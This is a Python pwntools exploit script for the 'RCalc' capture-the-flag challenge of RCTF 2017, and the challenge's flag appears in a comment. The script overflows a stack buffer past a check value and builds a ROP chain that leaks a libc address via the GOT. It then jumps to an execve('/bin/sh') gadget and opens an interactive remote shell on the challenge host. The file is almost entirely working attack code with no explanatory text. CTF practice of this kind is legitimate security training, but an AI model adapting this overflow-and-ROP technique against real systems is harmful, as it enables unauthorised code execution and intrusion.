# coding:utf-8
from pwn import *
import time, sys


run_argv = []
# local process envirnoment
# socat tcp-listen:22333,reuseaddr,fork system:./Recho
LOCAL = False
elf_name = "./RCalc"

#retmote args
# remote_host = "127.0.0.1"
remote_host = "rcalc.2017.teamrois.cn"
remote_port = 2333

elf = ELF(elf_name)
#context.clear(arch="i386")
context.clear(arch="amd64")

if LOCAL:
    execv_binsh_off = 0xF0567
    lib_st_offset = 0x20740
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    execv_binsh_off = 0xF0567
    lib_st_offset = 0x20740
    context.log_level = "debug"
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mMenu(idx):
    io.recvuntil("Your choice:")
    io.sendline(str(idx))

def mAdd(numb1, numb2):
    mMenu(1)
    io.sendline(str(numb1))
    io.sendline(str(numb2))

def mSub(numb1, numb2):
    mMenu(2)
    io.sendline(str(numb1))
    io.sendline(str(numb2))

def mMod(numb1, numb2):
    mMenu(3)
    io.sendline(str(numb1))
    io.sendline(str(numb2))

def mMulti(numb1, numb2):
    mMenu(4)
    io.sendline(str(numb1))
    io.sendline(str(numb2))

def mExit():
    mMenu(5)

def leak():
    log.info("printf got:"+hex(elf.got['printf']))
    tmp_str = ''
    # [0x09,0x0d] [0x20, ]
    for i in range(0x21, 255):
        tmp_str += chr(i)
    pause()
    calc_numb1 = 0x24242420
    calc_numb2 = 0x24242420
    io.recvuntil("Input your name pls: ")
    payload = '0'*0x108
    payload += p64(calc_numb1*calc_numb2)   # numb chk

    payload += p64(0x602288)
    payload += p64(0x0000000000401123)  # pop rdi ret
    payload += p64(0x601FF0)    # libc got
    payload += p64(0x400850)
    payload += p64(0x400FB7)    # return address
    payload += '\n'
    io.send(payload)
    for i in range(0x20):
        mAdd(calc_numb1, calc_numb2)
        dlySend("yes")
    mSub(0x100, 0x100)
    dlySend("yes")
    mAdd(0x100, 0x11)
    dlySend("yes")
    mMulti(calc_numb1, calc_numb2)
    dlySend("yes")
    mExit()
    data = io.recv(6)
    return u64(data.ljust(8, chr(0)))

def s_exp():
    libc_start_addr = leak()
    libc_base_addr = libc_start_addr - lib_st_offset
    log.info("libc base address:"+hex(libc_base_addr))
    exec_binshaddr = libc_base_addr + execv_binsh_off

    io.recvuntil("Input your name pls: ")
    payload = '0'*0x108
    payload += p64(0x111)   # numb chk
    payload += '0'*0x08
    payload += p64(exec_binshaddr)
    payload += '\n'
    io.send(payload)
    mExit()
    io.interactive()
    # RCTF{Y0u_kn0w_th3_m4th_9e78cc}

if __name__ == "__main__":
    s_exp()
    pause()
